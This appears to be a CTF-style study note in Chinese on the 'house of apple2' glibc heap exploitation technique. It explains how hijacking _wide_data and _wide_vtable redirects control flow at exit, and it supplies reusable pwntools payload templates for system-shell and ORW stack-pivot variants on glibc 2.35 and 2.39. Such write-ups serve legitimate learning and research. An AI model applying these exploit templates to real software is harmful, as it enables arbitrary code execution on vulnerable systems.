---
title: house of apple2学习
published: 2026-03-12
description: ""
image: ''
tags: [PWN，note,heap]
category: PWN
draft: false
---

# house of apple2学习


## house of apple 2

glibc 2.35之后，关于许多hook的攻击方式均已失效，介于此，house of apple成为新的攻击手段

### 利用条件

1. 可以从main函数返回或者从exit函数退出
2. 需要泄露出libc与heap base
3. 可以使用一次largebin attack造成任意地址写入堆地址

### 过程

程序从 main 返回或者执行 exit 后会遍历`_IO_list_all`存放的每一个`IO_FILE`结构体，如果满足条件的话，会调用每个结构体中`vtable->_overflow`函数指针指向的函数。

```c
pwndbg> p *_IO_list_all
$1 = {
  file = {
    _flags = -72540026,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7e1b780 <_IO_2_1_stdout_>,
    _fileno = 2,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7ffff7e1ca60 <_IO_stdfile_2_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7e1a8a0 <_IO_wide_data_2>,#这是我们需要劫持的成员
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7e17600 <_IO_file_jumps>
}
```



glibc2.23及之前没有`vtable`的检测，可以任意劫持执行的函数。之后增加了对`vtable`合法性的检测的`IO_validate_vtable`函数。

```c
/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

而house of apple2主要针对的是_IO_FILE中的__wide_data成员，_wide_data指向的结构体是一个和FILE结构体十分相像的wide_data结构体，下面是他的内容

```c
pwndbg> p _IO_wide_data_2
$2 = {
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0,
    __value = {
      __wch = 0,
      __wchb = "\000\000\000"
    }
  },
  _IO_last_state = {
    __count = 0,
    __value = {
      __wch = 0,
      __wchb = "\000\000\000"
    }
  },
  _codecvt = {
    __cd_in = {
      step = 0x0,
      step_data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0,
        __invocation_counter = 0,
        __internal_use = 0,
        __statep = 0x0,
        __state = {
          __count = 0,
          __value = {
            __wch = 0,
            __wchb = "\000\000\000"
          }
        }
      }
    },
    __cd_out = {
      step = 0x0,
      step_data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0,
        __invocation_counter = 0,
        __internal_use = 0,
        __statep = 0x0,
        __state = {
          __count = 0,
          __value = {
            __wch = 0,
            __wchb = "\000\000\000"
          }
        }
      }
    }
  },
  _shortbuf = L"",
  _wide_vtable = 0x7ffff7e170c0 <_IO_wfile_jumps>
}
```

同样具有一个vtable指针去指向一个虚表，而这个vtable指针所指向的内容是没有检测的，这意味着我们可以把它劫持到我们伪造的虚表，从而控制执行流

### 调用链

```c
_IO_wfile_overflow --> _IO_wdoallocbuf --> _IO_WDOALLOCATE
```

在程序执行exit退出时，会刷新FILE结构体里面的所有内容
在刷新FILE结构体的时候会执行执行`_IO_flush_all_lockp`函数
在这个过程中会调用到`_IO_wfile_overflow`函数
而在调用`_IO_wfile_overflow`函数的时候，会调用到`IO_wdoallocbuf`函数，我们来看看这个函数的源码

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)//
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
             fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```

### 条件

对`fp`的设置如下：

- `_flags`设置为`~(2 | 0x8 | 0x800)`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为` sh;`，注意前面有两个空格
- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_write_base`设置为`0`，即满足`*(A + 0x18) = 0`
- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`

```python
file_addr=heap_base+0x700
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(0)   # _IO_save_base 
fake_io += p64(0)*3   # from _IO_backup_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # _IO_list_all fake vtable
fake_io += p64(wide_vtable_addr)
fake_io += p64(system)
```

25行：

我们之前提到过，为了方便，我们是将这个堆块同时给伪造成 IO_FILE结构体和 IO_wide_data结构体，而wide_data成员指向的就是 _IO_wide_data结构体的位置，所以我们把它构造到file_addr即可

30行

这个是我们伪造的用于绕过vtable检测的同时调用__doallocate的，不用过多在意，记住即可

31行

这个是我们伪造的 _IO_wide_data结构体的vtable指针，他决定了我们会调用哪里的函数

32行

这一个位置就是我们要调用的函数，你要执行什么就在这里放什么

| **偏移 (Offset)** | **_IO_FILE 原始字段** | **_wide_data 重叠字段** | **填入的具体值**                       | **核心作用与备注**                                           |
| ----------------- | --------------------- | ----------------------- | -------------------------------------- | ------------------------------------------------------------ |
| **+0x00**         | `_flags`              | -                       | *(脚本中未体现，通常填 `0` 或 ` sh;`)* | 绕过初期检查；同时也是 `system` 的 `rdi` 参数。              |
| **+0x08**         | `_IO_read_ptr`        | -                       | *(脚本中未体现)*                       | 通常配合 `flags` 填入特定值或留空。                          |
| **+0x10**         | `_IO_read_end`        | -                       | `0`                                    | 正常填充。                                                   |
| **+0x18**         | `_IO_read_base`       | **`_IO_write_base`**    | `0`                                    | **【重叠利用】** 满足触发条件 `*(A + 0x18) == 0`。           |
| **+0x20**         | `_IO_write_base`      | `_IO_write_ptr`         | `0`                                    | 配合下方的 `ptr` 制造溢出条件。                              |
| **+0x28**         | `_IO_write_ptr`       | `_IO_write_end`         | `1`                                    | 满足触发条件 `_IO_write_ptr > _IO_write_base`。              |
| **+0x30**         | `_IO_write_end`       | **`_IO_buf_base`**      | `0`                                    | **【重叠利用】** 满足触发条件 `*(A + 0x30) == 0`。           |
| **+0x88**         | `_lock`               | -                       | `_IO_stdfile_2_lock`                   | 必须填入一个合法的、可写的内存地址，绕过锁断言。             |
| **+0xa0**         | `_wide_data`          | -                       | **`fp` (自身地址)**                    | **【核心枢纽】** 强行将宽字符数据区引回当前结构体首地址。    |
| **+0xc0**         | `_mode`               | -                       | `-1` (`0xFFFFFFFF`)                    | 满足触发条件 `_mode <= 0`。                                  |
| **+0xd8**         | `vtable`              | -                       | `_IO_wfile_jumps`                      | 劫持常规流操作，引流至宽字符溢出处理函数。                   |
| **+0xe0**         | *(超出 FILE 范围)*    | **`_wide_vtable`**      | `fp + 0xe8 - 0x68`                     | **【重叠利用】** 指定宽字符虚表地址，精心计算的偏移。        |
| **+0xe8**         | *(超出 FILE 范围)*    | *(函数指针目标)*        | `system` / `gadget`                    | **【最终斩首】** `_wide_vtable + 0x68` 刚好落在此处，劫持 RIP！ |





**ORW:**

```python
file_addr=heap_base+0x700
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
fake_io = b""
fake_io += p64(0)  # _IO_read_end		0x10
fake_io += p64(0)  # _IO_read_base		0x18
fake_io += p64(0)  # _IO_write_base		0x20
fake_io += p64(1)  # _IO_write_ptr		0x28
fake_io += p64(0)  # _IO_write_end		0x30
fake_io += p64(0)  # _IO_buf_base;		0x38
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)		0x40


fake_io += p64(ROPchain_addr)   # _IO_save_base 		0x48



fake_io += p64(0)*3   # from _IO_backup_base to _markers		0x50-0x60
fake_io += p64(0)  # the FILE chain ptr								0x68
fake_io += p32(2)  # _fileno for stderr is 2						0x70
fake_io += p32(0)  # _flags2, usually 0								0x74
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1				0x78
fake_io += p16(0)  # _cur_column									0x82
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding										0x84
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock		0x88
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1				0x90
fake_io += p64(0)  # _codecvt, usually 0							0x98
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1				0xa0
fake_io += p64(0) * 3  # from _freeres_list to __pad5				0xa8-0xb8
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1						0xc0
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable			
fake_io += p64(libc.sym['_IO_wfile_jumps'])  # _IO_list_all fake vtable		0xd8
fake_io += p64(wide_vtable_addr)													#	0xe0


fake_io += p64(libc.sym['svcudp_reply']+26)								# 0xe8
```



```c
<svcudp_reply+26>:  mov  rbp,QWORD PTR [rdi+0x48]
<svcudp_reply+30>:  mov  rax,QWORD PTR [rbp+0x18]
<svcudp_reply+34>:  lea  r13,[rbp+0x10]
<svcudp_reply+38>:  mov  DWORD PTR [rbp+0x10],0x0
<svcudp_reply+45>:  mov  rdi,r13
<svcudp_reply+48>:  call  QWORD PTR [rax+0x28]
```

和上面的system一样，此时rdi是指向file_addr的，此时对于rdi的索引就是0x48，所以file_addr+0x48处的内容会被赋值给rbp，此时我们将这个位置处改为orw_addr，再基于下面的call调用，我们就能实现栈迁移打orw了，而file_addr+0x48处正好是IO结构体中的_IO_save_base了

下面我们讲讲对于call调用的赋值，调用的是&rax+0x28处的内容，我们把这个内容改为leave;ret的话就能实现栈迁移了

而rax的赋值是基于rbp的0x18偏移处,而此时rbp已经被我们迁移到了orw_addr处，只要我们将orw_addr+0x18处改为一个可控制的地址，再基于这个地址+0x28处写上leave;ret即可完成栈迁移

巧妙的是，在我们的orw构造中，我么先用pop_rdx_rbx进行寄存器赋值，而rbx正好对应orw_addr+0x18处，并且rbx是我们调用orw用不到的寄存器，所以我们在这里写上一个可控的堆地址即可，这里我写的是orw_addr+0x100处，而read和write的地址都是orw_addr+0x200处，不会产生冲突，此时我们把orw_addr+0x100处距离0x28偏移处写上leave;ret即可调用完成，而orw_addr我写入的是能够控制的一个chunk的fd指针处，便于我们对chunk进行写入

### 板子

GLIBC 2.35

```python
file_addr=heap_base+0x700
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(0)   # _IO_save_base 
fake_io += p64(0)*3   # from _IO_backup_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1		将这个堆块同时给伪造成 IO_FILE结构体和 IO_wide_data结构体
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # _IO_list_all fake vtable		伪造的用于绕过vtable检测的同时调用__doallocate的
fake_io += p64(wide_vtable_addr)		# _IO_wide_data结构体的vtable指针
fake_io += p64(system)
```



GLIBC 2.39

```python
fake_file = b''
fake_file = p64(0)		#_flags通常设置为 0
fake_file += p64(1)		#_IO_read_ptr 设置为 1或者任何小于 _IO_write_ptr 的值
fake_file=  fake_file.ljust(0x28,b'\x00')+p64(heap1)	# offset 0x20处为_IO_write_base ，offset 0x28处为_IO_write_ptr，我们需要满足的条件是_IO_write_ptr > _IO_write_base，此处_IO_write_base已经被设置为0，而_IO_write_ptr为heap1，显然大于_IO_write_base，成功骗过了 _IO_flush_all，让它去执行我们伪造在 vtable 里的目标函数。
fake_file = fake_file.ljust(0x68,b'\x00')+p64(fake_heap)
fake_file = fake_file.ljust(0x80,b'\x00')+p64(fake_heap)
fake_file = fake_file.ljust(0xb8,b'\x00')+p64(IO_wfile_jumps) 



fake_file = b''
fake_file = p64(0)		#_flags通常设置为 0
fake_file += p64(1)		#_IO_read_ptr 设置为 1或者任何小于 _IO_write_ptr 的值
fake_file = fake_file.ljust(0x18,b'\x00')
fake_file += p64(0)		#_IO_write_base 填入 0
fake_file += p64(addr1)	# _IO_write_ptr	填入一个大于 0 的合法可读写地址（用于满足 write_ptr > write_base）
fake_file = fake_file.ljust(0x98,b'\x00')	
fake_file += p64(fake_wide_data_addr)		#填入伪造的宽字符结构体基址
fake_file = fake_file.ljust(0xb8,b'\x00')	
fake_file += p64(1)		#_mode = 1
fake_file = fake_file.ljust(0xd0,b'\x00')
fake_file += p64(libc.sym['_IO_wfile_jumps'])


fake_wide_data = b''
fake_wide_data = fake_wide_data.ljust(0x10,b'\x00')
fake_wide_data += p64(0)	#_IO_write_base 填入 0
fake_wide_data += p64(0)	#_IO_write_ptr 填入 0（让系统以为宽字符缓冲区未分配）
fake_wide_data = fake_wide_data.ljust(0xd8,b'\x00')
fake_wide_data += p64(fake_wide_vtable_addr)	#填入伪造的宽字符虚表基址


fake_wide_vtable = b''
fake_wide_vtable = fake_wide_vtable.ljust(0x60,b'\x00')
fake_wide_vtable += p64(libcbase+0x17923D)		#libc 2.39中svcudp_reply的gadget

```
